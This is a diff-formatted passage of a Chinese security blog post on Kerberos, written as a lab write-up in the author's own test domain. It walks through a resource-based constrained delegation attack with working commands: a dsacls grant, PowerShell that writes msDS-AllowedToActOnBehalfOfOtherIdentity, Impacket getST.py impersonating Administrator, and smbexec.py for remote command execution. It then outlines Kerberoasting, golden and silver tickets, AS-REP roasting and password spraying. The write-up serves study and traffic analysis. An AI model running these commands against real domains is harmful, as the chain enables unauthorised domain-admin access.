+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">DistinguishedName : CN=Administrator,CN=Users,DC=test,DC=mydomain</span><br><span class="line">Enabled           : True</span><br><span class="line">GivenName         : </span><br><span class="line">Name              : Administrator</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : <span class="number">7554700</span>c<span class="literal">-95aa-4205-b2c5-ee459ec67438</span></span><br><span class="line">SamAccountName    : Administrator</span><br><span class="line">SID               : S<span class="literal">-1-5-21-1484574725-2487331599-3880452622-500</span></span><br><span class="line">Surname           : </span><br><span class="line">UserPrincipalName : </span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=Guest,CN=Users,DC=test,DC=mydomain</span><br><span class="line">Enabled           : False</span><br><span class="line">GivenName         : </span><br><span class="line">Name              : Guest</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : <span class="number">1</span>a557d38<span class="literal">-2b47-4524-888b-db7215af07d3</span></span><br><span class="line">SamAccountName    : Guest</span><br><span class="line">SID               : S<span class="literal">-1-5-21-1484574725-2487331599-3880452622-501</span></span><br><span class="line">Surname           : </span><br><span class="line">UserPrincipalName : </span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=admin,CN=Users,DC=test,DC=mydomain</span><br><span class="line">Enabled           : True</span><br><span class="line">GivenName         : </span><br><span class="line">Name              : admin</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : <span class="number">35465</span>fe2<span class="literal">-a697-407d-b949-1f9b2db55634</span></span><br><span class="line">SamAccountName    : admin</span><br><span class="line">SID               : S<span class="literal">-1-5-21-1484574725-2487331599-3880452622-1001</span></span><br><span class="line">Surname           : </span><br><span class="line">UserPrincipalName : </span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=krbtgt,CN=Users,DC=test,DC=mydomain</span><br><span class="line">Enabled           : False</span><br><span class="line">GivenName         : </span><br><span class="line">Name              : krbtgt</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : fb36a01d<span class="literal">-cdec-4c92-bf2b-aa8f1ec7d107</span></span><br><span class="line">SamAccountName    : krbtgt</span><br><span class="line">SID               : S<span class="literal">-1-5-21-1484574725-2487331599-3880452622-502</span></span><br><span class="line">Surname           : </span><br><span class="line">UserPrincipalName : </span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=bob,OU=运维部,DC=test,DC=mydomain</span><br><span class="line">Enabled           : True</span><br><span class="line">GivenName         : </span><br><span class="line">Name              : bob</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : <span class="number">99</span>be4d6f<span class="literal">-df78-41c7-814c-e01e3311d493</span></span><br><span class="line">SamAccountName    : bob</span><br><span class="line">SID               : S<span class="literal">-1-5-21-1484574725-2487331599-3880452622-1108</span></span><br><span class="line">Surname           : bob</span><br><span class="line">UserPrincipalName : bob@test.mydomain</span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=alice,OU=行政部,DC=test,DC=mydomain</span><br><span class="line">Enabled           : True</span><br><span class="line">GivenName         : </span><br><span class="line">Name              : alice</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : <span class="number">719</span>b54fa<span class="literal">-3d1d-4602-ac64-02ac9e6d8287</span></span><br><span class="line">SamAccountName    : alice</span><br><span class="line">SID               : S<span class="literal">-1-5-21-1484574725-2487331599-3880452622-1109</span></span><br><span class="line">Surname           : alice</span><br><span class="line">UserPrincipalName : alice@test.mydomain</span><br></pre></td></tr></table></figure>
+<p>我想使用普通的域用户<code>alice</code>对<code>bob</code>对象进行资源委派。</p>
+<p>上述列表中 <code>SamAccountName</code> 是 <code>alice</code>（普通用户格式）。<strong>关键前提</strong>: 为了进行 S4U (Service for User) 操作，<code>alice</code> 必须拥有 <strong>SPN (Service Principal Name)</strong>。普通的机器账户（如 <code>computer$</code>）默认有 SPN，但普通用户 <code>alice</code> 默认没有。</p>
+<p>在域控上为<code>alice</code>用户注册一个<code>spn</code>，命令如下：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># spn</span></span><br><span class="line"><span class="built_in">Set-ADUser</span> <span class="literal">-Identity</span> alice <span class="literal">-ServicePrincipalNames</span> <span class="selector-tag">@</span>&#123;Add=<span class="string">&quot;final/test&quot;</span>&#125;</span><br><span class="line"><span class="comment"># 查询spn</span></span><br><span class="line"><span class="built_in">Get-ADUser</span> <span class="literal">-Identity</span> alice <span class="literal">-Properties</span> ServicePrincipalName | <span class="built_in">Select-Object</span> Name, ServicePrincipalName</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251123125333154.png" alt="image-20251123125333154"></p>
+<p>现在是有了<code>spn</code>，还差<code>alice</code>对<code>bob</code>对象的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性有写的权限。</p>
+<p>在域控中执行下下面的命令：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsacls <span class="string">&quot;CN=bob,OU=运维部,DC=test,DC=mydomain&quot;</span> /G <span class="string">&quot;test\alice:WP;msDS-AllowedToActOnBehalfOfOtherIdentity&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>命令解析：</strong></p>
+<ul>
+<li><code>&quot;CN=bob,OU=运维部,DC=test,DC=mydomain&quot;</code>: 目标对象 Bob 的完整路径 (Distinguished Name)。</li>
+<li><code>/G</code>: 授予权限 (Grant)。</li>
+<li><code>test\alice</code>: 被授予权限的用户。</li>
+<li><code>:WP</code>: 权限类型为 <strong>W</strong>rite <strong>P</strong>roperty (写属性)。</li>
+<li><code>;msDS-AllowedToActOnBehalfOfOtherIdentity</code>: 指定具体的属性名称。</li>
+</ul>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251122225045926.png" alt="image-20251122225045926"></p>
+<p>ok，我们现在写的权限也有了。</p>
+<p>整个场景B的情况如下，该有的条件都满足了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">用户: alice (假设已获取该账户控制权，且该账户已被配置 SPN)</span><br><span class="line"></span><br><span class="line">权限: 对计算机对象 bob (CN=bob,OU=运维部,DC=test,DC=mydomain) 拥有 写权限 (GenericAll, GenericWrite, WriteDacl 或 WriteProperty -&gt; msDS-AllowedToActOnBehalfOfOtherIdentity)。</span><br><span class="line"></span><br><span class="line">攻击:</span><br><span class="line">1、配置信任关系 (Resource Constraint) 利用 alice 拥有的写权限，修改 bob 对象的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性。将 alice 的 SID (S-1-5-21...-1109) 封装为安全描述符并在该属性中添加，从而“强行”让 bob 信任 alice 的委派请求。</span><br><span class="line"></span><br><span class="line">2、伪造身份 (S4U2Self) alice 使用自己的凭据向 KDC 发起 S4U2Self 请求，以 Administrator 的名义请求访问 alice 自身的服务票据 (ST)。</span><br><span class="line">		结果：获得了一张 Administrator -&gt; alice 的票据 (Evidence Ticket)。</span><br><span class="line"></span><br><span class="line">3、获取目标票据 (S4U2Proxy) alice 使用上一步获取的 Evidence Ticket，向 KDC 发起 S4U2Proxy 请求，申请访问 bob 的 CIFS 服务 (cifs/bob.test.mydomain) 的票据。</span><br><span class="line">		结果：由于步骤1配置了信任，KDC 返回了一张 Administrator -&gt; bob 的服务票据。</span><br><span class="line"></span><br><span class="line">获取 bob 的管理员权限 alice 将步骤3获取的票据导入内存 (Pass-The-Ticket)，直接访问 \\bob.test.mydomain\c$。此时 bob 认为访问者是域管理员 Administrator，从而允许执行任意文件操作或进一步利用 (如创建计划任务、上传木马等)。</span><br></pre></td></tr></table></figure>
+<p>目前<code>alice</code>普通域账户的<code>spn</code>已经注册，为<code>final/test</code>且<code>alice</code>对<code>bob</code>对象的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性也有写的权限了。</p>
+<p>接下来就是完成**“写属性 -&gt; S4U2Self -&gt; S4U2Proxy”**这一整套攻击流程。</p>
+<p><strong>阶段0：基础环境配置（至关重要）</strong></p>
+<p>Kerberos协议对<strong>时间</strong>和<strong>域名解析</strong>非常敏感。</p>
+<p>1、配置DNS解析,Kali必须能解析域名。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/hosts</span><br><span class="line">192.168.233.131 dc.test.mydomain</span><br><span class="line">192.168.233.132 bob.test.mydomain</span><br></pre></td></tr></table></figure>
+<p>2、同步时间：Kerberos票据的时间戳误差不超过5min</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> ntpdate dc.test.mydomain</span><br></pre></td></tr></table></figure>
+<p><strong>阶段1：配置资源约束委派（写属性）</strong></p>
+<p>将 <code>alice</code> 添加到 <code>bob</code> 的 <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> 属性中。</p>
+<p>这里我为了方便，直接在域控中执行下面的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 准确获取 用户 Alice 的对象 (避免获取成计算机)</span></span><br><span class="line"><span class="variable">$AliceUser</span> = Get-ADUser -Identity alice</span><br><span class="line">Write-Host <span class="string">&quot;用户 Alice 的 SID 是: <span class="subst">$($AliceUser.SID)</span>&quot;</span> -ForegroundColor Green</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 构造 SDDL 字符串</span></span><br><span class="line"><span class="comment"># O:BAD: = 拥有者/组默认</span></span><br><span class="line"><span class="comment"># (A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SID) = 允许该SID进行所有操作(GenericAll)</span></span><br><span class="line"><span class="variable">$SDDL</span> = <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<span class="subst">$($AliceUser.SID)</span>)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 创建二进制的安全描述符</span></span><br><span class="line"><span class="variable">$SD</span> = New-Object System.Security.AccessControl.RawSecurityDescriptor(<span class="variable">$SDDL</span>)</span><br><span class="line"><span class="variable">$Bytes</span> = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$Bytes</span>, 0)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 强制覆盖写入 Bob 的属性</span></span><br><span class="line"><span class="comment"># 注意：这里使用 -Replace，会清除掉旧的错误配置(如果有的话)，只保留 Alice</span></span><br><span class="line">Set-ADComputer -Identity bob -Replace @&#123;<span class="string">&#x27;msDS-AllowedToActOnBehalfOfOtherIdentity&#x27;</span>=<span class="variable">$Bytes</span>&#125;</span><br><span class="line"></span><br><span class="line">Write-Host <span class="string">&quot;配置完成！Bob 现在只信任用户 Alice。&quot;</span> -ForegroundColor Cyan</span><br></pre></td></tr></table></figure>
+<p><strong>阶段 2 &amp; 3：执行S4U2Self 和 S4U2Proxy</strong></p>
+<p>接下来就是在Kali上使用Impacket工具集了。Impacket 工具集中的 <code>getST.py</code> (Get Service Ticket) 能够完美模拟 Rubeus 的 S4U 功能。它会自动处理 S4U2Self (拿自己的票) 和 S4U2Proxy (拿目标的票) 的全过程。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -spn cifs/bob.test.mydomain -impersonate Administrator -dc-ip 192.168.233.131 test.mydomain/alice:<span class="string">&#x27;qwer@1234&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>成功获取票据。</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251123134708769.png" alt="image-20251123134708769"></p>
+<p>导入票据并执行命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator@cifs_bob.test.mydomain@TEST.MYDOMAIN.ccache</span><br><span class="line">python3 smbexec.py -k -no-pass test.mydomain/Administrator@bob.test.mydomain</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251123134625752.png" alt="image-20251123134625752"></p>
+<p>再回头去看，我们的目的是了解使用了<code>S4u2Proxy</code>的基于资源的约束委派和普通的Kerberos协议的流量的区别。</p>
+<p>这里在生成票据的过程中，使用wireshark进行抓包，然后查看数据包。</p>
+<p>这里的additional-tickets就是增加的字段。</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251123135610791.png" alt="image-20251123135610791"></p>
 <h3 id="Kerberos协议中的安全问题">Kerberos协议中的安全问题</h3>
-<h3 id></h3>
+<p>Kerberos协议各阶段容易产生的安全问题如下图：</p>
+<p><img src="/2025/11/06/NTLM%E5%8D%8F%E8%AE%AE%E5%92%8CKerberos%E5%8D%8F%E8%AE%AE/image-20251117195046246.png" alt="image-20251117195046246"></p>
+<h4 id="PTH-PTK">PTH &amp; PTK</h4>
+<p>在AS-REQ阶段，使用的是用户密码Hash或AES Key加密的时间戳。当只获得了用户密码Hash时，发起AS-REQ会造成PTH攻击；当只获得用户密码的AES Key时，发起AS-REQ会造成PTK攻击。</p>
+<h4 id="域内用户枚举">域内用户枚举</h4>
+<p>AS-REQ包中cname字段的值代表用户名，这个值存在和不存在，返回的包不一样，所以可以用于枚举域内用户名，这种攻击方式被称为域内用户枚举攻击（当未获取到有效域用户权限时，可以使用这个方法枚举域内用户）。当用户名存在，密码正确和错误时，返回的包也不一样，所以可以进行用户名密码爆破。</p>
+<h4 id="密码喷洒">密码喷洒</h4>
+<p>对密码进行喷洒式的攻击，成为密码喷洒（Password Spraying）。针对同一个用户的连续密码猜测会导致账户被锁定，所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，从而避免账户被锁定。密码喷洒就是用固定的密码去爆破所有的用户名。</p>
+<h4 id="黄金票据-白银票据">黄金票据 &amp; 白银票据</h4>
+<p>**在AS-REP阶段，由于返回的TGT是由krbtgt用户的密码Hash加密的，因此如果我们拥有krbtgt的密码Hash就可以自己制作一个TGT，这个票据也被称为黄金票据。**这种攻击方式被称为黄金票据传递攻击。</p>
+<p>同样，<strong>在TGS-REP阶段，TGS-REP中的ST是使用服务的Hash进行加密的，如果我们拥有服务的Hash就可以签发任意用户的ST，这个票据也被称为白银票据</strong>，这种攻击方式也被称为白银票据传递攻击。</p>
+<p>相比较于黄金票据传递攻击，白银票据传递攻击使用的是要访问服务的Hash，而不是krbtgt的Hash。</p>
+<h4 id="AS-REP-Roasting攻击">AS-REP Roasting攻击</h4>
+<p>在AS-REP阶段，Logon Session Key是用用户密码Hash加密的，对于域用户，**如果设置了”Do not require Kerberos preauthentication“（不需要预认证）选项，攻击者会向域控的88端口发送AS-REQ，此时域控不会做任何验证就将TGT和该用户Hash加密的Logon Session Key返回。**这样，攻击者就可以对获取到的用户Hash加密的Logon Session Key进行离线破解，如果破解成功，就能得到该用户的密码明文，这种攻击方式被称为AS-REP Roasting攻击。</p>
+<h4 id="Kerberoasting攻击">Kerberoasting攻击</h4>
+<p><strong>在TGS-REP阶段，由于ST是用服务Hash加密的，因此，如果我们能获取到ST，就可以对该ST进行破解，得到服务的Hash，造成Kerberoasting攻击</strong>。这种攻击方式存在的另外一个原因是<strong>用户向KDC发起TGS_REQ请求时，不管用户对服务有没有访问权限，只要TGT正确，KDC都会返回ST</strong>。其实AS-REQ中的服务就是krbtgt，也就是说这种攻击方式同样可以用于AS-REP中的TGT，但之所以没见到这种攻击方式是因为krbtgt的密码是随机生成的，爆破不出来。</p>
+<h2 id="总结">总结</h2>
+<p>通过本章节的学习，我了解到了NTLM认证协议、Kerberos认证协议，根据协议的流程，我们也了解到了对应的攻击方法，哈希传递、白银票据、黄金票据、约束委派攻击等等。那么对于开头说的问题，这里我们全部都有答案了。我自己搭建的环境，相关的wireshark的流量，以及解密的keytab全部放在github<sup class="footnote-ref"><a href="#fn6" id="fnref6">[6]</a></sup>上了。</p>
 <h2 id="参考">参考</h2>
 <hr class="footnotes-sep">
 <section class="footnotes">
@@ -422,6 +639,10 @@
 <li id="fn3" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://www.rfc-editor.org/rfc/rfc4120.html">https://www.rfc-editor.org/rfc/rfc4120.html</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>
 </li>
 <li id="fn4" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn5" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p>
+</li>
+<li id="fn6" class="footnote-item"><p><a target="_blank" rel="noopener" href="https://github.com/x2nn/kerberos-network-packets">https://github.com/x2nn/kerberos-network-packets</a> <a href="#fnref6" class="footnote-backref">↩︎</a></p>
 </li>
 </ol>
 </section>
@@ -440,7 +661,7 @@
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
-              2025-11-14 14:01:28
+              2025-11-23 15:05:11
             </span>
             
                   <span class="post-tags">
@@ -504,7 +725,7 @@
     <div class="title">Contents</div>
     <div class="catalog-content">
       
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM%E5%8D%8F%E8%AE%AE"><span class="toc-text">NTLM协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash%E7%AE%97%E6%B3%95"><span class="toc-text">NTLM Hash算法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%82%A8%E7%9A%84NTLM-Hash"><span class="toc-text">Windows系统存储的NTLM Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM%E5%8D%8F%E8%AE%AE%E8%AE%A4%E8%AF%81"><span class="toc-text">NTLM协议认证[2]</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84NTLM%E8%AE%A4%E8%AF%81"><span class="toc-text">工作组环境下的NTLM认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84NTLM%E8%AE%A4%E8%AF%81"><span class="toc-text">域环境下的NTLM认证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-text">Kerberos协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E5%9F%BA%E7%A1%80"><span class="toc-text">Kerberos基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">Kerberos实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PAC"><span class="toc-text">PAC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REQ-AS-REP"><span class="toc-text">AS-REQ &amp; AS-REP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81AS-REQ%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">1、AS-REQ包分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81AS-REP%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">2、AS-REP包分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TGS-REQ-TGS-REP"><span class="toc-text">TGS-REQ &amp; TGS-REP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81TGS-REQ%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">1、TGS-REQ包分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81TGS-REP%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">2、TGS-REP包分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AP-REQ-AP-REP%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81"><span class="toc-text">AP-REQ &amp; AP-REP双向认证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81AP-REQ%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">1、AP-REQ包分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81AP-REP%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">2、AP-REP包分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S4u2Self-S4u2Proxy%E5%8D%8F%E8%AE%AE"><span class="toc-text">S4u2Self &amp; S4u2Proxy协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81S4u2Self"><span class="toc-text">1、S4u2Self</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81S4u2Proxy"><span class="toc-text">2、S4u2Proxy</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-text">Kerberos协议中的安全问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NTLM%E5%8D%8F%E8%AE%AE"><span class="toc-text">NTLM协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM-Hash%E7%AE%97%E6%B3%95"><span class="toc-text">NTLM Hash算法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%82%A8%E7%9A%84NTLM-Hash"><span class="toc-text">Windows系统存储的NTLM Hash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTLM%E5%8D%8F%E8%AE%AE%E8%AE%A4%E8%AF%81"><span class="toc-text">NTLM协议认证[2]</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B7%A5%E4%BD%9C%E7%BB%84%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84NTLM%E8%AE%A4%E8%AF%81"><span class="toc-text">工作组环境下的NTLM认证</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84NTLM%E8%AE%A4%E8%AF%81"><span class="toc-text">域环境下的NTLM认证</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E5%8D%8F%E8%AE%AE"><span class="toc-text">Kerberos协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E5%9F%BA%E7%A1%80"><span class="toc-text">Kerberos基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberos%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83"><span class="toc-text">Kerberos实验环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PAC"><span class="toc-text">PAC</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81PAC%EF%BC%9F"><span class="toc-text">为什么需要PAC？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PAC%E4%BD%8D%E4%BA%8E%E5%93%AA%E9%87%8C%EF%BC%9F"><span class="toc-text">PAC位于哪里？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PAC-%E5%8C%85%E5%90%AB%E5%93%AA%E4%BA%9B%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%EF%BC%9F"><span class="toc-text">PAC 包含哪些核心内容？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PAC%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-text">PAC的工作流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REQ-AS-REP"><span class="toc-text">AS-REQ &amp; AS-REP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81AS-REQ%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">1、AS-REQ包分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81AS-REP%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">2、AS-REP包分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TGS-REQ-TGS-REP"><span class="toc-text">TGS-REQ &amp; TGS-REP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81TGS-REQ%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">1、TGS-REQ包分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81TGS-REP%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">2、TGS-REP包分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AP-REQ-AP-REP%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81"><span class="toc-text">AP-REQ &amp; AP-REP双向认证</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81AP-REQ%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">1、AP-REQ包分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81AP-REP%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-text">2、AP-REP包分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#S4u2Self-S4u2Proxy%E5%8D%8F%E8%AE%AE"><span class="toc-text">S4u2Self &amp; S4u2Proxy协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81S4u2Self"><span class="toc-text">1、S4u2Self</span></a></li><li class="toc-item toc-level-4"><a 